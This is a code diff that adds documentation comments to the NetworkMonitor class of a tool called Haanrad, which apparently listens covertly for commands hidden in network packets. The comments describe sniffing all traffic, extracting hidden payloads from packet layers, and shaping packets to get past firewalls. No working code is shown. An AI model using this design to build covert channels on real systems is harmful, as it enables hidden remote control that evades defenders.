@@ -44,6 +44,13 @@ NetworkMonitor* NetworkMonitor::getInstance(TrafficAnalyzer * trafficAnalyzer, H
     return NetworkMonitor::instance;
 }
 
+/**
+ * normalizePacket is a helper method that nromalizes all packets destined for the TrafficAnalyzer. This is so that the
+ * source port of any packet will match an appropriate system interface Haanrad is operating on and ensure that the port
+ * values of the packet are valid for an outgoing packet. This is to ensure the highest chance of success in passing the
+ * system firewall
+ * @param meta PacketMeta - An object representation of the packet being normalized
+ */
 void NetworkMonitor::normalizePacket(PacketMeta *meta) {
 
     char * ptr = meta->packet;
@@ -102,6 +109,12 @@ void NetworkMonitor::normalizePacket(PacketMeta *meta) {
     }
 }
 
+/**
+ * isFullCommand is a helper function that determines if the command buffer currently contains the contents of a full
+ * HAAN packet. A full HAAN packet can then be parsed into a Message object and sent to the console to be presented
+ * to the user. isFullCommand also includes checks to clear the buffer if it contains garbage or an invalid packet
+ * @return Bool - the state of whether the buffer contains a complete HAAN packet
+ */
 bool NetworkMonitor::isFullCommand() {
 
     Logger::debug("NetworkMonitor:isFullCommand - Validating Data Retreived So Far");
@@ -153,6 +166,13 @@ bool NetworkMonitor::isFullCommand() {
     return true;
 }
 
+/**
+ * parseApplicationContent is a helper method that parses out HAAN packet payload information based on the protocol used
+ * and specified in the packet meta. All packets sent to this method are assumed to store their HAAN payloads in the
+ * applicationLayer.
+ * @param meta PacketMeta - An object representation of the packet being parsed for its application layer content
+ * @param applicationLayer Char * - A pointer to the application layer in the PacketMeta object
+ */
 void NetworkMonitor::parseApplicationContent(PacketMeta * meta, char * applicationLayer) {
 
     if(isOwnPacket(meta)){
@@ -195,6 +215,12 @@ void NetworkMonitor::parseApplicationContent(PacketMeta * meta, char * applicati
 
 }
 
+/**
+ * parseTransportContent is a helper method that parses out the HAAN packet payload from the transport layer based
+ * packets supported by Haanrad. This assumes that all packets passed into parseTransportContent store all of their
+ * content on the transport layer
+ * @param meta PacketMeta - An object representation of the packet being parsed for transport layer payload
+ */
 void NetworkMonitor::parseTransportContent(PacketMeta * meta) {
 
     //check this packet isn't our own
@@ -245,6 +271,12 @@ void NetworkMonitor::parseTransportContent(PacketMeta * meta) {
     }
 }
 
+/**
+ * isOwnPacket is a helper method that determines if the passed in packet is our own. Since libpcap can hear outgoing
+ * requests from the client to Haanrad, this method helps seperate these packets
+ * @param meta PacketMEta - packet information about the packet in question
+ * @return Bool - State as to whether the packet is ours or not. True means it is
+ */
 bool NetworkMonitor::isOwnPacket(PacketMeta *meta) {
 
     struct iphdr * ip = (struct iphdr *)meta->packet;
@@ -412,6 +444,11 @@ void NetworkMonitor::killListening() {
     }
 }
 
+/**
+ * getInterface is a helper method that fetches the appropriate "any" interface from libpcap. This is done by fetching
+ * all interfaces and searching through them until the "any" interface is found
+ * @return Bool - State of whether the interface could be found
+ */
 bool NetworkMonitor::getInterface() {
 
     Logger::debug("NetworkMonitor:getInterfaces - Initializing");
@@ -451,6 +488,11 @@ bool NetworkMonitor::getInterface() {
     return false;
 }
 
+/**
+ * listenForTraffic is the main startup method for the NetworkMonitor. listenForTraffic configures libpcap and the
+ * command buffer for operating and will hang until a full valid HAAN packet has been retrieved from the network.
+ * @return String * A complete HAAN packet
+ */
 string * NetworkMonitor::listenForTraffic() {
 
     //determine how we should listen - ask the SystemState what the current state is
